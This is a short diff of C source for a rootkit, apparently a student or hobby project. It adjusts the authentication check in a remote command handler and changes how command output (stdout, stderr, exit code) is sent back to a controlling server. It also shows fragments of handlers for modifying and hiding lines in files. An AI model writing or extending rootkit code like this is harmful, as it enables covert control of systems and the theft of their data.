@@ -112,7 +112,8 @@ int rootkit_command(char *command, unsigned command_size) {
 
     if (!is_auth && strncmp(command, "connect", 7) != 0 && strncmp(command, "help", 4) != 0) {
         send_to_server("You are not authentificated. See 'connect' command.\n");
-        return FAILURE;
+		ERR_MSG("rootkit_command: user not authentificated\n");
+        return -FAILURE;
     }
 
     int i;
@@ -197,11 +198,11 @@ int exec_handler(char *args) {
 
     if (catch_stds) {
         // Send the command output to the server
-        send_to_server("stdout:\n");
+        send_to_server("stdout:");
         send_file_to_server(STDOUT_FILE);
-        send_to_server("stderr:\n");
+        send_to_server("stderr:");
         send_file_to_server(STDERR_FILE);
-        send_to_server("terminated with code %d\n", exec_result.code);
+        send_to_server("terminated with code %d", exec_result.code);
     }
 
     return ret_code;
@@ -422,7 +423,6 @@ int play_audio_handler(char *args) {
  * Pas hyper bien, mais flemme de faire mieux, ras le cul du parsing
  */
 int modify_file_handler(char *args) {
-
     // Parameters
     char *path;
     int hide_line = 0;
